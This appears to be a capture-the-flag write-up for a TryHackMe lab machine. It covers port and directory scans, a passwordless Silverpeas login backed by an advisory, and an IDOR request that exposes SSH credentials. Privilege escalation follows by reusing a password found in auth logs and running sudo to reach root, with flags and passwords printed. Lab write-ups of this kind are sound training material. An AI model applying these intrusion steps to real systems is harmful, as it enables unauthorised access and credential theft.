@@ -1,0 +1,215 @@
+IP:10.10.44.226
+
+rustscan:
+
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 62
+
+
+nmap:
+
+PORT     STATE SERVICE    REASON         VERSION
+22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ0ia1tcuNvK0lfuy3Ep2dsElFfxouO3VghX5Rltu77M33pFvTeCn9t5A8NReq3felAqPi+p+/0eRRfYuaeHRT4=
+|   256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKecigNtiy6tW5ojXM3xQkbtTOwK+vqvMoJZnIxVowju
+80/tcp   open  http       syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
+|_http-title: Hack Smarter Security
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+8080/tcp open  http-proxy syn-ack ttl 62
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Tue, 27 May 2025 09:28:46 GMT
+|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Length: 0
+|     Connection: close
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 404 Not Found
+|     Connection: close
+|     Content-Length: 74
+|     Content-Type: text/html
+|     Date: Tue, 27 May 2025 09:28:45 GMT
+|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
+|_http-title: Error
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.94SVN%I=7%D=5/27%Time=683585CC%P=x86_64-pc-linux-gnu%r
+SF:(GetRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20clos
+SF:e\r\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Tu
+SF:e,\x2027\x20May\x202025\x2009:28:45\x20GMT\r\n\r\n<html><head><title>Er
+SF:ror</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTP
+SF:Options,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\
+SF:nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Tue,\x
+SF:2027\x20May\x202025\x2009:28:45\x20GMT\r\n\r\n<html><head><title>Error<
+SF:/title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPRequ
+SF:est,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nC
+SF:onnection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\
+SF:x20Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nCon
+SF:tent-Type:\x20text/html\r\nDate:\x20Tue,\x2027\x20May\x202025\x2009:28:
+SF:46\x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\
+SF:x20Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x2
+SF:0Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Ge
+SF:nericLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x2
+SF:00\r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad
+SF:\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r
+SF:(SSLSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length
+SF::\x200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTT
+SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\
+SF:x20close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Reque
+SF:st\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos
+SF:,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
+SF:ection:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20
+SF:Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPD
+SF:String,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r
+SF:\nConnection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x
+SF:20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\
+SF:n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+dirb on 80:
+
+dirb http://silverplatter.thm /usr/share/wordlists/dirb/common.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue May 27 05:32:45 2025
+URL_BASE: http://silverplatter.thm/
+WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://silverplatter.thm/ ----
+==> DIRECTORY: http://silverplatter.thm/assets/                                                                                                        
+==> DIRECTORY: http://silverplatter.thm/images/                                                                                                        
++ http://silverplatter.thm/index.html (CODE:200|SIZE:14124)                                                                                            
+                                                                                                                                                       
+---- Entering directory: http://silverplatter.thm/assets/ ----
+==> DIRECTORY: http://silverplatter.thm/assets/css/                                                                                                    
+==> DIRECTORY: http://silverplatter.thm/assets/js/                                                                                                     
+                                                                                                                                                       
+---- Entering directory: http://silverplatter.thm/images/ ----
+                                                                                                                                                       
+---- Entering directory: http://silverplatter.thm/assets/css/ ----
+                                                                                                                                                       
+---- Entering directory: http://silverplatter.thm/assets/js/ ----
+                                                                                                                                                       
+-----------------
+END_TIME: Tue May 27 05:57:54 2025
+DOWNLOADED: 23060 - FOUND: 1
+
+
+
+visiting site on port 80 and going to the contact page, we get this info:
+Contact
+
+If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".
+
+on port 8080, there is a login with Silverpeas:
+
+10.10.44.226:8080/silverpeas
+
+Silverpeas is also vulnerable, and you can log in without a password :) 
+https://github.com/advisories/GHSA-4w54-wwc9-x62c
+
+you can use the username found on the website to log in. going through the notifications, there is one from the Manager that says the following:
+Tyler just asked if I wanted to play VR but he left you out scr1ptkiddy (what a jerk). Want to join us? We will probably hop on in like an hour or so. 
+
+
+Meaning, there are at least 3 users on Silverpeas: scr1ptkiddy, Tyler and Manager.
+
+
+
+new IP: 10.10.219.18
+
+Logging as SilverAdmin, and reaching the notifications page, we can see and IDOR, where ID=2. We can change this to see other meesages:
+GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6 HTTP/1.1
+Host: 10.10.219.18:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://10.10.219.18:8080/silverpeas/RSILVERMAIL/jsp/Main
+Cookie: JSESSIONID=PExx8krLLcFWoxTp3Gt5xm-YSIvDfuDBydrzUIi_.ebabc79c6d2a; defaultDomain=0; svpLogin=SilverAdmin; Silverpeas_Directory_Help=IKnowIt
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes
+
+Username: tim
+Password:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
+
+
+we can now ssh to the machine using the username and password that we found.
+tim@silver-platter:~$ ls
+user.txt
+tim@silver-platter:~$ cat user.txt 
+THM{c4ca4238a0b923820dcc509a6f75849b}
+tim@silver-platter:~$ 
+
+
+
+PRIV ESC:
+
+tim@silver-platter:/$ id
+uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
+
+we can read logs. let's try to find if tyler has logged in somewhere:
+cd /var/log
+
+grep -iR Tyler
+
+auth.log.2:Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
+
+we get a password, let's try to see if he reused it for ssh, and it works:)
+
+tim@silver-platter:/var/log$ su tyler
+Password: 
+tyler@silver-platter:/var/log$ 
+
+
+PRIV ESC:
+
+tyler@silver-platter:/var/log$ sudo -l
+[sudo] password for tyler: 
+Sorry, try again.
+[sudo] password for tyler: 
+Matching Defaults entries for tyler on silver-platter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User tyler may run the following commands on silver-platter:
+    (ALL : ALL) ALL
+
+tyler@silver-platter:/var/log$ sudo su
+root@silver-platter:/var/log# _Zd_zx7N823/
+bash: _Zd_zx7N823/: No such file or directory
+root@silver-platter:/var/log# cd /root
+root@silver-platter:~# ls
+root.txt  snap  start_docker_containers.sh
+root@silver-platter:~# cat root.txt
+THM{098f6bcd4621d373cade4e832627b4f6}
+root@silver-platter:~# 
+
+    
+
+
+
+
